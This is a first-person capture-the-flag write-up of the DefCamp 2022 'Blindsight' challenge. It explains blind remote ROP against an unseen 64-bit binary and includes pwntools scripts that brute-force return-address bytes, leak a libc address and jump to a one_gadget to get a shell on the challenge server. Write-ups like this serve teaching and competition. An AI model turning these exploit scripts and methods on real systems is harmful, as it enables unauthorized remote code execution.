#### **Blindsight**,


was a pwn challenge from DefCamp 2022.

I got first blood on it (I played with Water Paddler).

It was a classic blind remote rop, with no binaries.

![](https://github.com/nobodyisnobody/write-ups/raw/main/DefCamp.CTF.2022/pwn/blindsight/pics/fuzz.gif)

Well, basicall we first have to find the size of the buffer overflow, if we send more than 88 bytes for input, the program will crash, and the LSB of the return address will be overwritten.

Then we write a little script that send all value between 0 to 255 for the lsb and see that various functions we can reach.. what is their output, etc...

a script like this can do the job.. (nothing complicated)

```python3
from pwn import *

for i in range(256):
  p = connect('34.159.129.6', 30550)
  print('trying char: '+hex(i))
  p.sendafter('friend?\n' , 'A'*88+chr(i))
  try:
    print(hexdump(p.recv(timeout=2)))
  except:
    print('.')
  p.close()
```

Ok let's see what we get bruteforcing the LSB of the return address,

case LSB =:
* 0x0a   --> print message 'No password for you!\n'
* 0x0c   --> print message 'No password for you!\n'
* 0x0e   --> print message 'Do not dump my memory!\n'
* 0x13  --> leak a part of the stack (we can see libc and stack addresses in it...)
* 0x1a   --> print message 'No password for you!\n'
* 0x1f  --> leak a part of the stack (we can see libc and stack addresses in it...)
* 0xbb --> print message 'Are you blind my friend?\n'

ok that's the result of out first quick fuzzing..

ok what is the next step?

well we know LSBs that return us messages, let's choose one of them,  0xBB for example.. and let's bruteforce the next LSBs in the return address..

we modify a bit the script above..and start again..

```python3
from pwn import *

for i in range(256):
  p = connect('34.159.129.6', 30550)
  print('trying char: '+hex(i))
  p.sendafter('friend?\n' , 'A'*88+p8(0xbb)+chr(i))
  try:
    print(hexdump(p.recv(timeout=2)))
  except:
    print('.')
  p.close()
```

ok we found that the second byte that come next is 0x07

we do the same for the third byte, and found that it is 0x40

So it gives us an address 0x4007bb.

That tell us two things,  that the binary is 64bit linux binary, and that it is non-PIE , the program binary is mapped at a fixed address,

that will make us things more simple...

so what's next..?

Well next step for this kind of challenge , is to find the libcsu gadget, that is almost always present inf 64bit binaries produced by gcc.

if you don't know what it the csu gadget, you can read this explanation for example (or google for: "libcsu gadget", "ret2csu" )

[https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9](https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9)

the libcsu gadget is often near the end of the binary, and it allows us to call a function inside the program, and to set the registers rdi, rsi, rdx..

the libcsu gadgets is in two part, one part set the registers,  it is a gadget that does:  pop rbx / pop rbp/pop r12/ pop r13 / pop r14 / pop r15 / ret

so 6 times pop, and a ret.

The second part set registers for the calling and call a function:    mov rdx, r15   /  mov rsi, r14 / mov edi, r13d / call qword[r12+rbx*8] , etc....

The second part with the "6 times pop" and ret, is easy to find once you know an address that return some sort of message, text.. (0x4007bb in our case..)

knowing that theses gadgets are at the end of the binary, we will start scanning from addresses a little after the one we found,

and send a ROP payload like this:  p64(address.tested) + p64(0xdeadbeef)*6 + p64(0x4007bb)

when address tested will be the correct address of the 6xpop gadget,  0x4007bb our function that print a message will be executed.. and we will receive a message in return..

if we receive nothing, we increase the tested adress...and so on... until we found the 6 x pop gadget


That's the "classic way".

When you know the "6 x pop" gadget address,  you can deduce easily the address of the second libcsu gadget that calls the function..

then with the knowledge of our 2 libcsu gadget, we will scan for a got entry of a puts, or a write, or a printf for example.. these got entries around the same addresses..

depending if the program is full relro, half relro.. etc...

then when you find one printf, or puts, or a write function,  you can dump whatever memory address you want.

You then dump the entire binary... analyse it...exploit it...and that's all...

It's a bit time consuming ... but the whole process works well...



Well, the "classic way" did not work for me, I did not found the "6 x pop" gadget...

So I started scanning the program functions before those I found.. addresses before 0x4007bb

and BINGO.. I found this address at 0x4006fb,

that returns me a part of the stack, and go back to the input, awaiting for our second payload ... perfect !

![](https://github.com/nobodyisnobody/write-ups/raw/main/DefCamp.CTF.2022/pwn/blindsight/pics/function.png)

so... what we have on stack ?

looking at the returned addresses with an experienced eye.. we can see what is probably a libc address at offset 0x10

probably two stack addresses at offsets 0x18 and 0x20

another libc address at 0x38 probably...

The libc is given in this challenge, and that will help us.

Let's start with the first libc address that ends with 620, and see what this could be...

![](https://github.com/nobodyisnobody/write-ups/raw/main/DefCamp.CTF.2022/pwn/blindsight/pics/readelf.png)

well ̀ ```__IO_2_1_stdout_``` seems a good candidate, it's at offset 0x3c5620..

so the plan:

* Send a first payload that calls 0x4006fb function, and calculate libc address with the leaks we got in return
* Send a second payload, with the address of a onegadget from libc-2.23.so... and enjoy..


let's give it a try...

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

libc = ELF('./libc-2.23.so')

host, port = '34.159.129.6', '30550'

p = remote(host,port)

# address that return us a chunk of stack, and ask input again (find by bruteforcing address)
test = 0x4006fb

payload = 'A'*88+p64(0x4006fb)

p.sendafter('friend?\n' , payload)

buff = p.recv()
# get libc leak from stack
leak = u64(buff[0x10:0x18])
libc.address = leak - 0x3c5620
print('libc base (could be): '+hex(libc.address))

print(hexdump(buff))

onegadgets = one_gadget('libc.so.6', libc.address)

payload = 'A'*88+p64(onegadgets[1])
p.send(payload)

p.interactive()
```

![](https://github.com/nobodyisnobody/write-ups/raw/main/DefCamp.CTF.2022/pwn/blindsight/pics/gotshell.gif)

and that's all...

*nobodyisnobody still pwning things..* (you know that little colorfull characters that move on screen...)
